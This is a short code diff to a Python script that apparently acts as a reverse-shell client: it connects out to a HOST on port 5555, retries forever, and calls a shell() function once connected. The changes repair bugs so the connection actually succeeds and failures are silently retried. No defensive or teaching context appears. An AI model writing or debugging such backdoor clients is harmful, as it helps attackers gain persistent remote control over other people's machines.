@@ -133,16 +133,16 @@ PORT = 5555
 # Retry connection every 20 seconds forever until the connection is astablished
 def connection():
     while True:
-        time.sleep(2)
+        time.sleep(15)
 
         try: 
-            s.connect(HOST, PORT)
+            s.connect((HOST, PORT))
             shell()
             s.close()
             break
 
         except:
-            connection()
+            pass
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
